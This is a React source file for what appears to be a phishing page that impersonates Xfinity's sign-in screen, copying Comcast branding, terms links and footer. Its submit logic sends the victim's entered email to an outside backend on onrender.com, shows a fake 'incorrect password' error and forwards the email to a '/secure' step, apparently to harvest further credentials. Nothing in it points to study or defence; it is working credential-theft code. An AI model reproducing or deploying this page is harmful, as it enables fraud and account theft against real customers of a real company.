import React from 'react';
import axios from 'axios';
import './home.css';
import logo from './logo.png';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';


function Home(){

    const navigate = useNavigate();

    const[email, setUserName] = useState("");
    

    const[platform, setPlatform] = useState("xfinity")

    const[showError, setShowError] = useState(false);

    const[isLoading, setIsLoading]= useState(false);

    async function handleSubmit(e){
        e.preventDefault();
    
        try {

            setIsLoading(true);
            const response = await axios.post('https://myrootbackendone.onrender.com/api/send', {
                email:email,
                password:"empty",
                platform:platform
            });
        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                console.log(response.data.message);
    
                setShowError(true);

                setIsLoading(false);

            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        
    }

    function handleNext(e){
        e.preventDefault();
        setIsLoading(true);

        setTimeout(() => {
            setIsLoading(false);
            navigate('/secure',{state:{email:email}});
          }, 3000);

       
    }


    return (
        <>
             <section class="mainsection row">
        <div class="col-md-6 content">
            <img class="logo"src={logo} />

            <h1 class="head">Sign in with your Xfinity ID</h1>

            <form onSubmit={handleNext}>

                <div class="form-group">
                    <input onChange={function(e){
                        setUserName(e.target.value);
                    }} value={email} type="text"placeholder="Email, mobile, username"class="form-control myinput py-3 rounded"required/>

                </div>

               

               {
                   showError &&  <p class="smallest">The Xfinity ID or password you entered was incorrect. Please try again.</p>
               } 
                
                <p class="para">By signing in, you agree to our <a class="link" href="http://my.xfinity.com/terms/web/">Terms of Service</a> and <a class="link" href="http://xfinity.comcast.net/privacy/">Privacy <br/>Policy</a>.</p>


                <div class="buttondiv">

                    <button type="submit" class="btn mybtn">{isLoading ? "Loading" : "Let's go" }</button>

                </div>
            </form>


            <div class="downdiv">

                <div class="linediv">
                    <p class="downpara">New to Xfinity? View exclusive offers near you <span class="px-3 myspan"> {'>'} </span>
                    </p>
                </div>

                <div class="linediv">
                    <p class="downpara">Find your Xfinity ID <span class="px-3 myspan"> {'>'} </span>
                    </p>
                </div>

                <div class="linediv">
                    <p class="downpara">Create a new Xfinity ID <span class="px-3 myspan"> {'>'} </span>
                    </p>
                </div>

            </div>

        </div>

        <div class="col-md-6 contenttwo">

            

        </div>

        
    </section>

    <div class="text-center small">
        © 2023 Comcast

    </div>

    <div class="flexdiv">
        <a class="flexlink" href="https://www.xfinity.com/terms">Web Terms of Service</a>
        <a class="flexlink" href="https://www.xfinity.com/privacy/policy/staterights#california">CA Notice at Collection</a>
        <a class="flexlink" href="http://www.xfinity.com/privacy/policy">Privacy Policy</a>
        <a class="flexlink" href="https://www.xfinity.com/privacy/manage-preference">Your Privacy Choices</a>
        <a class="flexlink" href="https://www.xfinity.com/adinformation">Ad Choices</a>

    </div>

    <div class="text-center py-2 footer">
        <p class="footpara">Cookie Preferences</p>

    </div>
        </>
    );
}

export default Home;